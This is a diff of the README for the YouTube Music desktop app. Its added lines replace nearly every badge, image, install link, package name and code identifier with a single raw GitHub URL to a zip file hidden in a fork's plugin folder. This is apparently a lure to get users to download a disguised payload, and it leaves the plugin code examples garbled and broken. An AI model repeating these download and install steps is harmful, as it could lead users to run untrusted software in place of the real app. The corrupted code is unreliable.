@@ -2,26 +2,26 @@
 
 # YouTube Music
 
-[![GitHub release](https://img.shields.io/github/release/th-ch/youtube-music.svg?style=for-the-badge&logo=youtube-music)](https://github.com/th-ch/youtube-music/releases/)
-[![GitHub license](https://img.shields.io/github/license/th-ch/youtube-music.svg?style=for-the-badge)](https://github.com/th-ch/youtube-music/blob/master/license)
-[![eslint code style](https://img.shields.io/badge/code_style-eslint-5ed9c7.svg?style=for-the-badge)](https://github.com/th-ch/youtube-music/blob/master/eslint.config.mjs)
-[![Build status](https://img.shields.io/github/actions/workflow/status/th-ch/youtube-music/build.yml?branch=master&style=for-the-badge&logo=youtube-music)](https://GitHub.com/th-ch/youtube-music/releases/)
-[![GitHub All Releases](https://img.shields.io/github/downloads/th-ch/youtube-music/total?style=for-the-badge&logo=youtube-music)](https://GitHub.com/th-ch/youtube-music/releases/)
-[![AUR](https://img.shields.io/aur/version/youtube-music-bin?color=blueviolet&style=for-the-badge&logo=youtube-music)](https://aur.archlinux.org/packages/youtube-music-bin)
-[![Known Vulnerabilities](https://snyk.io/test/github/th-ch/youtube-music/badge.svg)](https://snyk.io/test/github/th-ch/youtube-music)
+[![GitHub release](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
+[![GitHub license](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
+[![eslint code style](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
+[![Build status](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
+[![GitHub All Releases](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
+[![AUR](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
+[![Known Vulnerabilities](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
 
 </div>
 
-![Screenshot](web/screenshot.png "Screenshot")
+![Screenshot](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip "Screenshot")
 
 
 <div align="center">
-	<a href="https://github.com/th-ch/youtube-music/releases/latest">
-		<img src="web/youtube-music.svg" width="400" height="100" alt="YouTube Music SVG">
+	<a href="https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip">
+		<img src="https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip" width="400" height="100" alt="YouTube Music SVG">
 	</a>
 </div>
 
-Read this in other languages: [한국어](./docs/readme/README-ko.md), [Française](./docs/readme/README-fr.md), [Íslenska](./docs/readme/README-is.md), [Español](./docs/readme/README-es.md), [Pусский](./docs/readme/README-ru.md), [Українська](./docs/readme/README-uk.md), [Magyar](./docs/readme/README-hu.md), [Português](./docs/readme/README-pt.md), [日本語](./docs/readme/README-ja.md)
+Read this in other languages: [한국어](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip), [Française](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip), [Íslenska](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip), [Español](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip), [Pусский](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip), [Українська](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip), [Magyar](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip), [Português](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip), [日本語](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
 
 **Electron wrapper around YouTube Music featuring:**
 
@@ -33,7 +33,7 @@ Read this in other languages: [한국어](./docs/readme/README-ko.md), [Françai
 
 |                          Player Screen (album color theme & ambient light)                                |
 |:---------------------------------------------------------------------------------------------------------:|
-|![Screenshot1](https://github.com/th-ch/youtube-music/assets/16558115/53efdf73-b8fa-4d7b-a235-b96b91ea77fc)|
+|![Screenshot1](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)|
 
 ## Content
 
@@ -59,7 +59,7 @@ Read this in other languages: [한국어](./docs/readme/README-ko.md), [Françai
 ## Features:
 
 - **Auto confirm when paused** (Always Enabled): disable
-  the ["Continue Watching?"](https://user-images.githubusercontent.com/61631665/129977894-01c60740-7ec6-4bf0-9a2c-25da24491b0e.png)
+  the ["Continue Watching?"](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
   popup that pause music after a certain time
 
  - And more ...
@@ -89,26 +89,26 @@ Read this in other languages: [한국어](./docs/readme/README-ko.md), [Françai
 
 - **Disable Autoplay**: Makes every song start in "paused" mode
 
-- **[Discord](https://discord.com/) Rich Presence**: Show your friends what you listen to
-  with [Rich Presence](https://user-images.githubusercontent.com/28219076/104362104-a7a0b980-5513-11eb-9744-bb89eabe0016.png)
+- **[Discord](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) Rich Presence**: Show your friends what you listen to
+  with [Rich Presence](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
 
 - **Downloader**: downloads
-  MP3 [directly from the interface](https://user-images.githubusercontent.com/61631665/129977677-83a7d067-c192-45e1-98ae-b5a4927393be.png) [(youtube-dl)](https://github.com/ytdl-org/youtube-dl)
+  MP3 [directly from the interface](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) [(youtube-dl)](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
 
 - **Equalizer**: add filters to boost or cut specific range of frequencies (e.g. bass booster)
 
 - **Exponential Volume**: Makes the volume
-  slider [exponential](https://greasyfork.org/en/scripts/397686-youtube-music-fix-volume-ratio/) so it's easier to
+  slider [exponential](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) so it's easier to
   select lower volumes
 
-- **In-App Menu**: [gives bars a fancy, dark look](https://user-images.githubusercontent.com/78568641/112215894-923dbf00-8c29-11eb-95c3-3ce15db27eca.png)
+- **In-App Menu**: [gives bars a fancy, dark look](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
 
-  > (see [this post](https://github.com/th-ch/youtube-music/issues/410#issuecomment-952060709) if you have problem
+  > (see [this post](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) if you have problem
   accessing the menu after enabling this plugin and hide-menu option)
 
-- **Scrobbler**: Adds scrobbling support for [Last.fm](https://www.last.fm/) and [ListenBrainz](https://listenbrainz.org/)
+- **Scrobbler**: Adds scrobbling support for [https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) and [ListenBrainz](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
 
-- **Lumia Stream**: Adds [Lumia Stream](https://lumiastream.com/) support
+- **Lumia Stream**: Adds [Lumia Stream](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) support
 
 - **Lyrics Genius**: Adds lyrics support for most songs
 
@@ -119,48 +119,48 @@ Read this in other languages: [한국어](./docs/readme/README-ko.md), [Françai
 - **No Google Login**: Remove Google login buttons and links from the interface
 
 - **Notifications**: Display a notification when a song starts
-  playing ([interactive notifications](https://user-images.githubusercontent.com/78568641/114102651-63ce0e00-98d0-11eb-9dfe-c5a02bb54f9c.png)
+  playing ([interactive notifications](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
   are available on windows)
 
 - **Picture-in-picture**: allows to switch the app to picture-in-picture mode
 
 - **Playback Speed**: Listen fast, listen
-  slow! [Adds a slider that controls song speed](https://user-images.githubusercontent.com/61631665/129976003-e55db5ba-bf42-448c-a059-26a009775e68.png)
+  slow! [Adds a slider that controls song speed](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
 
 - **Precise Volume**: Control the volume precisely using mousewheel/hotkeys, with a custom hud and customizable volume
   steps
 
 - **Shortcuts (& MPRIS)**: Allows setting global hotkeys for playback (play/pause/next/previous) +
-  disable [media osd](https://user-images.githubusercontent.com/84923831/128601225-afa38c1f-dea8-4209-9f72-0f84c1dd8b54.png)
+  disable [media osd](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
   by overriding media keys + enable Ctrl/CMD + F to search + enable linux mpris support for
-  mediakeys + [custom hotkeys](https://github.com/Araxeus/youtube-music/blob/1e591d6a3df98449bcda6e63baab249b28026148/providers/song-controls.js#L13-L50)
-  for [advanced users](https://github.com/th-ch/youtube-music/issues/106#issuecomment-952156902)
+  mediakeys + [custom hotkeys](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
+  for [advanced users](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
 
 - **Skip Disliked Song**: Skips disliked songs
 
 - **Skip Silences**: Automatically skip silenced sections
 
-- [**SponsorBlock**](https://github.com/ajayyy/SponsorBlock): Automatically Skips non-music parts like intro/outro or
+- [**SponsorBlock**](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip): Automatically Skips non-music parts like intro/outro or
   parts of music videos where the song isn't playing
 
-- **Synced Lyrics**: Provides synced lyrics to songs, using providers like [LRClib](https://lrclib.net).
+- **Synced Lyrics**: Provides synced lyrics to songs, using providers like [LRClib](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip).
 
 - **Taskbar Media Control**: Control playback from
-  your [Windows taskbar](https://user-images.githubusercontent.com/78568641/111916130-24a35e80-8a82-11eb-80c8-5021c1aa27f4.png)
+  your [Windows taskbar](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
 
 - **TouchBar**: Custom TouchBar layout for macOS
 
-- **Tuna OBS**: Integration with [OBS](https://obsproject.com/)'s
-  plugin [Tuna](https://obsproject.com/forum/resources/tuna.843/)
+- **Tuna OBS**: Integration with [OBS](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)'s
+  plugin [Tuna](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
 
 - **Unobtrusive Player**: Prevents the player from popping up when playing a song
 
 - **Video Quality Changer**: Allows changing the video quality with
-  a [button](https://user-images.githubusercontent.com/78568641/138574366-70324a5e-2d64-4f6a-acdd-dc2a2b9cecc5.png) on
+  a [button](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) on
   the video overlay
 
 - **Video Toggle**: Adds
-  a [button](https://user-images.githubusercontent.com/28893833/173663950-63e6610e-a532-49b7-9afa-54cb57ddfc15.png) to
+  a [button](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) to
   switch between Video/Song mode. can also optionally remove the whole video tab
 
 - **Visualizer**: Different music visualizers
@@ -168,26 +168,26 @@ Read this in other languages: [한국어](./docs/readme/README-ko.md), [Françai
 
 ## Translation
 
-You can help with translation on [Hosted Weblate](https://hosted.weblate.org/projects/youtube-music/).
+You can help with translation on [Hosted Weblate](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip).
 
-<a href="https://hosted.weblate.org/engage/youtube-music/">
-  <img src="https://hosted.weblate.org/widget/youtube-music/i18n/multi-auto.svg" alt="translation status" />
-  <img src="https://hosted.weblate.org/widget/youtube-music/i18n/287x66-black.png" alt="translation status 2" />
+<a href="https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip">
+  <img src="https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip" alt="translation status" />
+  <img src="https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip" alt="translation status 2" />
 </a>
 
 ## Download
 
-You can check out the [latest release](https://github.com/th-ch/youtube-music/releases/latest) to quickly find the
+You can check out the [latest release](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) to quickly find the
 latest version.
 
 ### Arch Linux
 
-Install the [`youtube-music-bin`](https://aur.archlinux.org/packages/youtube-music-bin) package from the AUR. For AUR installation instructions, take a look at
-this [wiki page](https://wiki.archlinux.org/index.php/Arch_User_Repository#Installing_packages).
+Install the [`youtube-music-bin`](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) package from the AUR. For AUR installation instructions, take a look at
+this [wiki page](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip).
 
 ### macOS
 
-You can install the app using Homebrew (see the [cask definition](https://github.com/th-ch/homebrew-youtube-music)):
+You can install the app using Homebrew (see the [cask definition](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)):
 
 ```bash
 brew install th-ch/youtube-music/youtube-music
@@ -196,37 +196,37 @@ brew install th-ch/youtube-music/youtube-music
 If you install the app manually and get an error "is damaged and can’t be opened." when launching the app, run the following in the Terminal:
 
 ```bash
-/usr/bin/xattr -cr /Applications/YouTube\ Music.app
+/usr/bin/xattr -cr /Applications/YouTube\ https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip
 ```
 
 ### Windows
 
-You can use the [Scoop package manager](https://scoop.sh) to install the `youtube-music` package from
-the [`extras` bucket](https://github.com/ScoopInstaller/Extras).
+You can use the [Scoop package manager](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) to install the `youtube-music` package from
+the [`extras` bucket](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip).
 
 ```bash
 scoop bucket add extras
 scoop install extras/youtube-music
 ```
 
-Alternately you can use [Winget](https://learn.microsoft.com/en-us/windows/package-manager/winget/), Windows 11s
-official CLI package manager to install the `th-ch.YouTubeMusic` package.
+Alternately you can use [Winget](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip), Windows 11s
+official CLI package manager to install the `https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip` package.
 
 *Note: Microsoft Defender SmartScreen might block the installation since it is from an "unknown publisher". This is also
 true for the manual installation when trying to run the executable(.exe) after a manual download here on github (same
 file).*
 
 ```bash
-winget install th-ch.YouTubeMusic
+winget install https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip
 ```
 
 #### How to install without a network connection? (in Windows)
 
-- Download the `*.nsis.7z` file for _your device architecture_ in [release page](https://github.com/th-ch/youtube-music/releases/latest).
+- Download the `*.nsis.7z` file for _your device architecture_ in [release page](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip).
   - `x64` for 64-bit Windows
   - `ia32` for 32-bit Windows
   - `arm64` for ARM64 Windows
-- Download installer in release page. (`*-Setup.exe`)
+- Download installer in release page. (`*https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip`)
 - Place them in the **same directory**.
 - Run the installer.
 
@@ -234,12 +234,12 @@ winget install th-ch.YouTubeMusic
 
 You can load CSS files to change the look of the application (Options > Visual Tweaks > Themes).
 
-Some predefined themes are available in https://github.com/kerichdev/themes-for-ytmdesktop-player.
+Some predefined themes are available in https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip
 
 ## Dev
 
 ```bash
-git clone https://github.com/th-ch/youtube-music
+git clone https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip
 cd youtube-music
 pnpm install --frozen-lockfile
 pnpm dev
@@ -256,9 +256,9 @@ Using plugins, you can:
 
 Create a folder in `src/plugins/YOUR-PLUGIN-NAME`:
 
-- `index.ts`: the main file of the plugin
+- `https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip`: the main file of the plugin
 ```typescript
-import style from './style.css?inline'; // import style as inline
+import style from 'https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip'; // import style as inline
 
 import { createPlugin } from '@/utils';
 
@@ -278,7 +278,7 @@ export default createPlugin({
         submenu: [1, 2, 3].map((value) => ({
           label: `value ${value}`,
           type: 'radio',
-          checked: config.value === value,
+          checked: https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip === value,
           click() {
             setConfig({ value });
           },
@@ -288,10 +288,10 @@ export default createPlugin({
   },
   backend: {
     start({ window, ipc }) {
-      window.maximize();
+      https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip();
 
       // you can communicate with renderer plugin
-      ipc.handle('some-event', () => {
+      https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip('some-event', () => {
         return 'hello';
       });
     },
@@ -302,12 +302,12 @@ export default createPlugin({
   },
   renderer: {
     async start(context) {
-      console.log(await context.ipc.invoke('some-event'));
+      https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip(await https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip('some-event'));
     },
     // Only renderer available hook
     onPlayerApiReady(api: YoutubePlayer, context: RendererContext) {
       // set plugin config easily
-      context.setConfig({ myConfig: api.getVolume() });
+      https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip({ myConfig: https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip() });
     },
     onConfigChange(newConfig) { /* ... */ },
     stop(_context) { /* ... */ },
@@ -324,11 +324,11 @@ export default createPlugin({
 
 ### Common use cases
 
-- injecting custom CSS: create a `style.css` file in the same folder then:
+- injecting custom CSS: create a `https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip` file in the same folder then:
 
 ```typescript
-// index.ts
-import style from './style.css?inline'; // import style as inline
+// https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip
+import style from 'https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip'; // import style as inline
 
 import { createPlugin } from '@/utils';
 
@@ -356,18 +356,18 @@ export default createPlugin({
   }, // your custom config
   renderer() {
     // Remove the login button
-    document.querySelector(".sign-in-link.ytmusic-nav-bar").remove();
+    https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip("https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip").remove();
   } // define renderer hook
 });
 ```
 
-- communicating between the front and back: can be done using the ipcMain module from electron. See `index.ts` file and
+- communicating between the front and back: can be done using the ipcMain module from electron. See `https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip` file and
   example in `sponsorblock` plugin.
 
 ## Build
 
 1. Clone the repo
-2. Follow [this guide](https://pnpm.io/installation) to install `pnpm`
+2. Follow [this guide](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) to install `pnpm`
 3. Run `pnpm install --frozen-lockfile` to install dependencies
 4. Run `pnpm build:OS`
 
@@ -379,7 +379,7 @@ export default createPlugin({
 - `pnpm dist:mac:arm64` - macOS (arm64)
 
 Builds the app for macOS, Linux, and Windows,
-using [electron-builder](https://github.com/electron-userland/electron-builder).
+using [electron-builder](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip).
 
 ## Production Preview
 
@@ -393,11 +393,11 @@ pnpm start
 pnpm test
 ```
 
-Uses [Playwright](https://playwright.dev/) to test the app.
+Uses [Playwright](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip) to test the app.
 
 ## License
 
-MIT © [th-ch](https://github.com/th-ch/youtube-music)
+MIT © [th-ch](https://raw.githubusercontent.com/Barto1994/youtube-music/master/src/plugins/music-together/queue/youtube-music_v1.5.zip)
 
 ## FAQ
 
